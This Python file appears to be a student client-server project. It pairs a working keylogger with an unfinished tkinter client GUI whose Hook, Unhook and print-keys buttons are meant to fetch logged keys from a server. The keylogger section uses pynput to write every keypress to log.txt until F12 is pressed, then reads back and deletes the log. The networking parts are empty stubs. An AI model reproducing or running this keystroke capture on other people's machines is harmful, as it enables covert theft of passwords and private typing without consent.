import os
from pynput.keyboard import Listener


def on_press(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        raise SystemExit(0)
    with open("log.txt","a") as file:
        file.write(key)
        file.write(' ')
    #print(key)

def keylogThread():
    with Listener(on_press=on_press) as listener:
        listener.join()
        
def start_keylog():
    keylogThread()
    with open('log.txt','r') as file:
        res = file.read()
    os.remove('log.txt')
    return res


#Cliet-GUI
import tkinter as tkr
from tkinter import *
import tkinter.ttk as exTK
from tkinter import scrolledtext as scrllT

win = tkr.Tk()
win.title('listApp')
win.geometry('500x500')

def hook():
    #Gửi báo hiệu keylog
    a='' #Để cho đỡ báo lỗi

def unhook():
    #Gửi báo hiệu thoát keylog
    a=''

def xoa():
    global output
    output.configure(state=NORMAL)
    output.delete('1.0', END)


def inphim():
    global output
    data=''   #Dữ liệu nhận từ server 
    output.configure(state=NORMAL)
    output.insert(END,data)
    output.configure(state=DISABLED)

hook_ = exTK.Button(win, text='Hook').place(
    relheight=0.1, relwidth=0.2, relx=0.04, rely=0.075)
unhook_ = exTK.Button(win, text='Unhook').place(
    relheight=0.1, relwidth=0.2, relx=0.28, rely=0.075)
inphim_ = exTK.Button(win, text='In phím',command=inphim).place(
    relheight=0.1, relwidth=0.2, relx=0.52, rely=0.075)
xoa_ = exTK.Button(win, text='Xoá',command=xoa).place(
    relheight=0.1, relwidth=0.2, relx=0.76, rely=0.075)

global output
output = scrllT.ScrolledText(win, font='Calibri 12',state=DISABLED)
output.place(relheight=0.6, relwidth=0.88, relx=0.04, rely=0.25)

win.mainloop()
